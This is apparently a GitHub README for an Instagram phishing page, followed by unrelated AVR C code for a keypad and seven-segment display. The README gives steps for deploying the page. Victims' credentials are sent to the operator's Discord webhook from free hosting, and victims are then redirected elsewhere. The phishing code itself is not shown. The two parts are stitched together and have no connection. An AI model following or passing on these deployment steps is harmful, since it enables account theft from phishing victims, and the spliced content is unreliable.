# HOW TO USE
**- My Instagram phishing page is really easy to use, you only have to replace WEBHOOK on line `101` by your Discord webhook :**


![webhook](https://user-images.githubusercontent.com/81310818/123550149-869fee00-d76c-11eb-9938-34a444eb00e1.PNG)<br>
**- Next you upload it in your website (like netlify or 000webhost, they are free)**<br>
**- When someone will login you will receive his credentials and he will be redirected to a funny video on Instagram for example.**<br/>
**- You can edit the redirection link by editing it on line 108 in the js part in HTML code.**
**- You can also change the redirection link in the line `108`. 
**- Just replace redirection `https://intagram.com` link with your own link **

 code

#include <avr/io.h>
#define F_CPU 16000000UL
#include <util/delay.h>

void dat(unsigned char);
void keypad(void);

int main() {
	DDRD = 0x0F;     // Set PD0 - PD3 as output for rows, PD4 - PD7 as input for columns
	DDRC = 0xFF;     // Set PORTC as output for seven-segment display
	PORTD = 0xFF;    // Enable pull-up resistors on PORTD inputs

	// Disable UART (not used here)
	UCSR0B &= ~(1 << TXEN0);
	UCSR0B &= ~(1 << RXEN0);

	while (1) {
		keypad();    // Continuously check for keypad input
	}

	return 0;
}

void keypad() {
	unsigned char c1, c2, c3, c4;

	// Row 1 (checks keys 1, 2, 3, /)
	PORTD = 0xFE;    // Set row 1 low (PD0)
	_delay_ms(1);    // Small delay for stability
	c1 = PIND & (1 << PIND4);
	c2 = PIND & (1 << PIND5);
	c3 = PIND & (1 << PIND6);
	c4 = PIND & (1 << PIND7);
	if (c1 == 0) { dat(1); while ((PIND & (1 << PIND4)) == 0); }
	else if (c2 == 0) { dat(2); while ((PIND & (1 << PIND5)) == 0); }
	else if (c3 == 0) { dat(3); while ((PIND & (1 << PIND6)) == 0); }
	else if (c4 == 0) { dat(10); while ((PIND & (1 << PIND7)) == 0); }  // Placeholder for '/'

	// Row 2 (checks keys 4, 5, 6, *)
	PORTD = 0xFD;    // Set row 2 low (PD1)
	_delay_ms(1);
	c1 = PIND & (1 << PIND4);
	c2 = PIND & (1 << PIND5);
	c3 = PIND & (1 << PIND6);
	c4 = PIND & (1 << PIND7);
	if (c1 == 0) { dat(4); while ((PIND & (1 << PIND4)) == 0); }
	else if (c2 == 0) { dat(5); while ((PIND & (1 << PIND5)) == 0); }
	else if (c3 == 0) { dat(6); while ((PIND & (1 << PIND6)) == 0); }
	else if (c4 == 0) { dat(11); while ((PIND & (1 << PIND7)) == 0); }  // Placeholder for '*'

	// Row 3 (checks keys 7, 8, 9, -)
	PORTD = 0xFB;    // Set row 3 low (PD2)
	_delay_ms(1);
	c1 = PIND & (1 << PIND4);
	c2 = PIND & (1 << PIND5);
	c3 = PIND & (1 << PIND6);
	c4 = PIND & (1 << PIND7);
	if (c1 == 0) { dat(7); while ((PIND & (1 << PIND4)) == 0); }
	else if (c2 == 0) { dat(8); while ((PIND & (1 << PIND5)) == 0); }
	else if (c3 == 0) { dat(9); while ((PIND & (1 << PIND6)) == 0); }
	else if (c4 == 0) { dat(12); while ((PIND & (1 << PIND7)) == 0); }  // Placeholder for '-'

	// Row 4 (checks keys 0, =, +)
	PORTD = 0xF7;    // Set row 4 low (PD3)
	_delay_ms(1);
	c1 = PIND & (1 << PIND4);
	c2 = PIND & (1 << PIND5);
	c3 = PIND & (1 << PIND6);
	c4 = PIND & (1 << PIND7);
	if (c1 == 0) { dat(0); while ((PIND & (1 << PIND4)) == 0); }
	else if (c2 == 0) { dat(13); while ((PIND & (1 << PIND5)) == 0); }  // Placeholder for '='
	else if (c3 == 0) { dat(14); while ((PIND & (1 << PIND6)) == 0); }  // Placeholder for '+'
}

void dat(unsigned char y) {
	// Seven-segment encoding for digits 0-9 and placeholders for symbols
	unsigned char seven_seg_array[15] = {
		0x3F, // 0
		0x06, // 1
		0x5B, // 2
		0x4F, // 3
		0x66, // 4
		0x6D, // 5
		0x7D, // 6
		0x07, // 7
		0x7F, // 8
		0x6F, // 9
		0x40, // '/' - Placeholder
		0x49, // '*' - Placeholder
		0x63, // '-' - Placeholder
		0x71, // '=' - Placeholder
		0x76  // '+' - Placeholder
	};

	PORTC = seven_seg_array[y];   // Output to seven-segment display
}
